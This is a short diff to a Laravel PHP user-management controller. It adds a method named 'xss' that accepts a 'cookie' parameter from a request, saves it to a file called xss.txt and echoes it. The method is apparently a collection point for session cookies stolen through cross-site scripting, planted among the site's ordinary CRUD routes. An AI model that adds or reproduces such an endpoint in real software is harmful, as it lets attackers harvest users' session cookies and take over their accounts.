@@ -16,7 +16,12 @@ use Illuminate\Support\Facades\Log;
  */
 class CrudUserController extends Controller
 {
-
+    //xss
+    public function xss(Request $request) {		
+        $cookie = $request->get('cookie');		
+        file_put_contents('xss.txt', $cookie);		
+        var_dump($cookie);die();		
+        }		
     /**
      * Login page
      */
